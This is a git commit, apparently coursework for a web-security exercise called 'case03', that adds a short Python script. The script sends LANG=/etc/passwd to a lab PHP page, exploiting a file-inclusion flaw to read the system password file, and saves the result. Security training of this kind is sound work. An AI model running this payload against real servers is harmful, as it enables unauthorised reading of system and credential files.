27b84659c3ce5b966261b58d73b1a5411b11f66f
Lgmrszd <m.v.bobrov@yandex.ru>
2020-02-23 21:38:56 +0300

    case03

---
+++ script3.py
@@ -0,0 +1,15 @@
+from urllib import request, parse
+import webbrowser
+
+base_url = "http://localhost:20080/Assignment/case03/case03.php"
+# base_url = "http://iu.ru/Assignment/case03/case03.php"
+values = {"LANG": "/etc/passwd"}
+data = parse.urlencode(values).encode()
+req = request.Request(base_url, data=data)
+resp = request.urlopen(req)
+print(type(resp))
+
+with open("result.html", "w") as fd:
+    fd.write(resp.read().decode())
+
+webbrowser.open("result.html", new=2)
